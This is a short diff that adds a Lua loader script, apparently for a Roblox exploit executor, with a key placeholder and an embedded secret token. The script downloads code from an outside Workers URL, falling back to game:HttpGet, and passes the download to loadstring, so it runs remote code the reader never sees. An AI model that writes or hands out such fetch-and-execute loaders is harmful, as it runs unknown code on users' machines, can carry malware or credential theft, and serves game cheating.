@@ -1,0 +1,6 @@
+getgenv().key = "{KEY}"
+local _u = "https://exhub.qxrap.workers.dev/?secret=x9Kp2mQvL8nRtY4w"
+local _b; local _r = request or http_request
+if _r then local ok, r = pcall(_r, {Url=_u, Method="GET"}) if ok and r and r.StatusCode == 200 then _b = r.Body end end
+if not _b then _b = game:HttpGet(_u) end
+loadstring(_b)()
